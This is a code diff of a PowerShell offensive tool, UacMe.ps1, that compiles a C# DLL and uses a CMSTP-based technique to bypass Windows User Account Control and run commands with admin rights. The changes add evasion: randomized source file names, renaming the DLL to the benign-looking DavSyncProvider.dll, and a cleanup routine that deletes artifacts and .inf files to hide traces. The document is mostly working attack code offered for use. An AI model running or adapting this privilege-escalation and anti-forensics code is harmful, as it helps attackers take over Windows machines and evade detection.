@@ -6,22 +6,18 @@
    Tested Under: Windows 10 (18363) x64 bits
    Required Dependencies: Reflection.Assembly {native}
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.3
+   PS cmdlet Dev version: v1.1.3
 
-.DESCRIPTION
-   User Account Control, commonly abbreviated UAC, is a Windows security component introduced
-   in Windows Vista and Windows Server 2008. UAC restricts processes access to admin level
-   resources and operations as much as possible, unless they are explicitly granted by the user.
-   
-.NOTES   
-   This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass using native
-   PS [Reflection.Assembly]::Load() technic to load our dll and elevate privileges (user->admin)
+.DESCRIPTION 
+   This CmdLet creates\compiles Source.CS into Trigger.dll and performs UAC bypass
+   using native Powershell [Reflection.Assembly]::Load(IO) technic to load our dll
+   and elevate privileges { user -> admin } or to exec one command with admin privs!
 
 .Parameter Action
    Accepts arguments: Bypass OR Clean
 
 .Parameter Execute
-   Accepts the command to be executed! (cmd|powershell)
+   Accepts the command\appl to be executed! (cmd|powershell)
 
 .EXAMPLE
    PS C:\> Get-Help .\UacMe.ps1 -full
@@ -52,6 +48,8 @@
    None. You cannot pipe objects into UacMe.ps1
 
 .OUTPUTS
+   Payload file written to C:\Windows\Temp\455pj4k3.inf
+
    Privilege Name                Description                                   State
    ============================= ============================================= ========
    SeShutdownPrivilege           Encerrar o sistema                            Disabled
@@ -62,7 +60,7 @@
 
    UAC State     : Enabled
    UAC Settings  : Notify Me
-   ReflectionDll : C:\Users\pedro\AppData\Local\Temp\Trigger.dll
+   ReflectionDll : C:\Users\pedro\AppData\Local\Temp\DavSyncProvider.dll
    Execute       : powershell -file C:\Users\pedro\AppData\Local\Temp\redpill.ps1
    
 .LINK
@@ -124,11 +122,8 @@ If($Action -ieq "Bypass"){
    
    
    ## Delete files left behind by this cmdlet in previous runs!
-   If(Test-Path -Path "$Env:TMP\Source.sc" -EA SilentlyContinue){
-      Remove-Item -Path "$Env:TMP\Source.sc" -Force
-   }
-   If(Test-Path -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue){
-      Remove-Item -Path "$Env:TMP\Trigger.dll" -Force  
+   If(Test-Path -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue){
+      Remove-Item -Path "$Env:TMP\DavSyncProvider.dll" -Force  
    }   
 
 
@@ -237,7 +232,8 @@ ShortSvcName=`"`"CorpVPN`"`"
 ")
 
    ## Write Source.cs script into %tmp% directory!
-   echo "$RawCSScript"|Out-File "$Env:TMP\Source.cs" -encoding ascii -force
+   $BSDEdit = -join ((65..90) + (97..122) | Get-Random -Count 7 | % {[char]$_})
+   echo "$RawCSScript"|Out-File "$Env:TMP\$BSDEdit.cs" -encoding ascii -force
 
    ## Get system User Account Control settings
    # [String]::IsNullOrWhiteSpace((Get-Content -Path "$Env:TMP\lksfdv.log" -EA SilentlyContinue))
@@ -267,23 +263,23 @@ ShortSvcName=`"`"CorpVPN`"`"
 
 
    ## Source.cs script compilation to Trigger.dll and execution { EOP }
-   If(Test-Path -Path "$Env:TMP\Source.cs" -EA SilentlyContinue){
+   If(Test-Path -Path "$Env:TMP\$BSDEdit.cs" -EA SilentlyContinue){
    
-      Add-Type -TypeDefinition ([IO.File]::ReadAllText("$Env:TMP\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$Env:TMP\Trigger.dll"
-      If(-not(Test-Path -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue)){## Make sure Trigger.dll as created!
+      Add-Type -TypeDefinition ([IO.File]::ReadAllText("$Env:TMP\$BSDEdit.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "$Env:TMP\DavSyncProvider.dll"
+      If(-not(Test-Path -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue)){## Make sure Trigger.dll as created!
 
-         Write-Host "`n`n[error] $Env:TMP\Trigger.dll not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
+         Write-Host "`n`n[error] $Env:TMP\DavSyncProvider.dll not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
          exit ## Exit @UacMe
       }
 
       ## Load Trigger.dll into memory
-      [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$Env:TMP\Trigger.dll"))|Out-Null
+      [Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$Env:TMP\DavSyncProvider.dll"))|Out-Null
       cd $Env:TMP;[CMSTPvuln]::Execute("$Execute")|Out-Null
       cd $Working_Directory ## Return to UacMe working directory!
       
    }Else{## [error] $Env:TMP\Source.cs not found\created!
    
-      Write-Host "`n`n[error] $Env:TMP\Source.cs not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
+      Write-Host "`n`n[error] $Env:TMP\$BSDEdit.cs not found\created!`n`n" -ForeGroundColor Red -BackGroundColor Black
       exit ## Exit @UacMe
    
    }
@@ -298,13 +294,13 @@ ShortSvcName=`"`"CorpVPN`"`"
    ## Build Output Table
    Write-Host "`nUAC State     : $UacStatus"
    Write-Host "UAC Settings  : $UacSettings"
-   Write-Host "ReflectionDll : $Env:TMP\Trigger.dll"
+   Write-Host "ReflectionDll : $Env:TMP\DavSyncProvider.dll"
    Write-Host "Execute       : $Execute"
    
    ## Clean ALL artifacts left behind!
    Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
-   Remove-Item -Path "$Env:TMP\Source.cs" -EA SilentlyContinue -Force
-   Remove-Item -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue -Force  
+   Remove-Item -Path "$Env:TMP\$BSDEdit.cs" -EA SilentlyContinue -Force
+   Remove-Item -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue -Force  
 
 }
 
@@ -334,34 +330,50 @@ If($Action -ieq "Clean"){
    .OUTPUTS
       Artifacts PowershellLogs ShellPrivs
       --------- -------------- ----------
-      3         2              Admin
+      2         2              Admin
+
+      List of artifacts deleted!
+      --------------------------
+      C:\WINDOWS\temp\iu3elgrv.inf
+      C:\WINDOWS\temp\uf8yrkwo.inf
    #>
 
+   $MyList = $null
    [int]$Artifacts = 0
    ## Clean ALL artifacts left behind!
-   If(Test-Path -Path "$Env:TMP\Source.cs" -EA SilentlyContinue){
-      Remove-Item -Path "$Env:TMP\Source.cs" -EA SilentlyContinue -Force
+   If(Test-Path -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue){   
+      Remove-Item -Path "$Env:TMP\DavSyncProvider.dll" -EA SilentlyContinue -Force
       $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
-   }
-   If(Test-Path -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue){   
-      Remove-Item -Path "$Env:TMP\Trigger.dll" -EA SilentlyContinue -Force
-      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
+      $MyList += "$Env:TMP\DavSyncProvider.dll`n" ## Add Entry to $MyList
    }
    If(Test-Path -Path "$Env:TMP\graca.log" -EA SilentlyContinue){   
       Remove-Item -Path "$Env:TMP\graca.log" -EA SilentlyContinue -Force
       $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
+      $MyList += "$Env:TMP\graca.log`n" ## Add Entry to $MyList
    }
 
-   
-   ## This function deletes ALL .inf files from 'C:\Windows\Temp'
+
+   ## This function deletes ALL .cs files from '%tmp%'
    # directory. If the 'CreationTime' of the files Matches todays date!
    $TodaysSc = Get-date -Format "dd/MM/yyyy" ## Get todays date: 19/04/2021
+   $CleanInf = (Get-ChildItem -Path "$Env:TMP" | Where-Object { 
+      $_.CreationTime.ToString() -Match "$TodaysSc" -and $_.Name -Match '(.cs)$' 
+   }).FullName
+   ForEach($Item in $CleanInf){## Delete ALL .cs files found from &tmp%
+      Remove-Item -Path "$Item" -EA SilentlyContinue -Force
+      $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
+      $MyList += "$Item`n" ## Add Entry to $MyList
+   }
+
+   ## This function deletes ALL .inf files from 'C:\Windows\Temp'
+   # directory. If the 'CreationTime' of the files Matches todays date!
    $CleanInf = (Get-ChildItem -Path "$Env:WINDIR\temp" | Where-Object { 
       $_.CreationTime.ToString() -Match "$TodaysSc" -and $_.Name -Match '(.inf)$' 
    }).FullName
    ForEach($Item in $CleanInf){## Delete ALL .inf files found from C:\Windows\Temp dir!
       Remove-Item -Path "$Item" -EA SilentlyContinue -Force
       $Artifacts = $Artifacts+1 ## Count how many artifacts are cleanned!
+      $MyList += "$Item`n" ## Add Entry to $MyList
    }
    
    
@@ -406,6 +418,12 @@ If($Action -ieq "Clean"){
    ## Display Data Table
    $mytable|Format-Table -AutoSize
    Start-Sleep -Seconds 1
+
+   If(-not($MyList -ieq $null)){
+      Write-Host "List of artifacts deleted!"
+      Write-Host "--------------------------"
+      Write-Host "$MyList"
+   }
 
 }
 Write-Host "`n"
